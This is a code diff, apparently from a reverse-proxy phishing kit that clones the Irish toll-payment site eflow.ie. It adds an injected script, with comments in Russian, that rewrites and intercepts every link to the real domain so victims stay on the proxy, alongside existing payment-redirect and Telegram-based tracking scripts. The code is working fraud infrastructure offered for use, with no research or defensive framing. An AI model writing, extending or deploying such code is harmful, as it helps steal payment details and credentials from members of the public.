@@ -1407,9 +1407,139 @@ const proxyOptions = {
 </script>`;
             
             // Inject scripts on ALL HTML pages
-            // Include: reCAPTCHA fix, payment redirect, and user tracking
+            // Include: reCAPTCHA fix, payment redirect, user tracking, and link interceptor
             const trackingScript = telegramLogger.getTrackingScript();
-            let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript + '\n' + trackingScript;
+            
+            // CRITICAL: Link interceptor script to prevent redirects to eflow.ie
+            const linkInterceptorScript = `
+<script>
+(function() {
+  'use strict';
+  const PROXY_ORIGIN = window.location.origin;
+  const TARGET_DOMAIN = 'eflow.ie';
+  const PROXY_DOMAIN = window.location.hostname;
+  
+  // Функция для перехвата и исправления ссылок
+  function interceptLink(link) {
+    if (!link || !link.href) return;
+    
+    try {
+      const url = new URL(link.href, window.location.href);
+      
+      // Если ссылка ведет на eflow.ie - заменяем на прокси-домен
+      if (url.hostname === TARGET_DOMAIN || url.hostname === 'www.' + TARGET_DOMAIN) {
+        url.hostname = PROXY_DOMAIN;
+        url.protocol = window.location.protocol;
+        link.href = url.toString();
+      }
+    } catch (e) {
+      // Если не удалось распарсить URL, проверяем строку напрямую
+      if (link.href && (link.href.includes(TARGET_DOMAIN) || link.getAttribute('href')?.includes(TARGET_DOMAIN))) {
+        link.href = link.href.replace(new RegExp(TARGET_DOMAIN, 'gi'), PROXY_DOMAIN);
+        link.href = link.href.replace(/^http:/, window.location.protocol);
+      }
+    }
+  }
+  
+  // Функция для перехвата кликов на ссылки
+  function interceptClick(e) {
+    const link = e.target.closest('a');
+    if (!link || !link.href) return;
+    
+    try {
+      const url = new URL(link.href, window.location.href);
+      
+      // Если ссылка ведет на eflow.ie - предотвращаем переход и исправляем
+      if (url.hostname === TARGET_DOMAIN || url.hostname === 'www.' + TARGET_DOMAIN) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        
+        url.hostname = PROXY_DOMAIN;
+        url.protocol = window.location.protocol;
+        
+        // Переходим на прокси-версию
+        window.location.href = url.toString();
+        return false;
+      }
+    } catch (e) {
+      // Если не удалось распарсить, проверяем строку
+      if (link.href && link.href.includes(TARGET_DOMAIN)) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        
+        const fixedHref = link.href.replace(new RegExp(TARGET_DOMAIN, 'gi'), PROXY_DOMAIN).replace(/^http:/, window.location.protocol);
+        window.location.href = fixedHref;
+        return false;
+      }
+    }
+  }
+  
+  // Обработать все существующие ссылки
+  function processAllLinks() {
+    const links = document.querySelectorAll('a[href]');
+    links.forEach(link => {
+      interceptLink(link);
+    });
+  }
+  
+  // Перехватывать клики на всех ссылках (включая логотип)
+  document.addEventListener('click', interceptClick, true); // Используем capture phase для раннего перехвата
+  document.addEventListener('mousedown', interceptClick, true); // Также перехватываем mousedown
+  
+  // Обработать ссылки при загрузке DOM
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', processAllLinks);
+  } else {
+    processAllLinks();
+  }
+  
+  // Использовать MutationObserver для динамически созданных ссылок
+  const observer = new MutationObserver(function(mutations) {
+    mutations.forEach(function(mutation) {
+      mutation.addedNodes.forEach(function(node) {
+        if (node.nodeType === 1) { // Element node
+          // Проверить сам узел
+          if (node.tagName === 'A' && node.href) {
+            interceptLink(node);
+          }
+          // Проверить дочерние ссылки
+          const links = node.querySelectorAll && node.querySelectorAll('a[href]');
+          if (links) {
+            links.forEach(interceptLink);
+          }
+        }
+      });
+    });
+  });
+  
+  // Начать наблюдение
+  if (document.body) {
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true,
+      attributes: true,
+      attributeFilter: ['href']
+    });
+  } else {
+    document.addEventListener('DOMContentLoaded', function() {
+      observer.observe(document.body, {
+        childList: true,
+        subtree: true,
+        attributes: true,
+        attributeFilter: ['href']
+      });
+    });
+  }
+  
+  // Периодическая проверка (на случай если MutationObserver пропустит что-то)
+  setInterval(processAllLinks, 2000);
+  
+})();
+</script>`;
+            
+            let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript + '\n' + linkInterceptorScript + '\n' + trackingScript;
             
           // CRITICAL: Inject at THE VERY START of <head> to execute BEFORE any other scripts
           const hasHeadOpen = bodyString.includes('<head>');
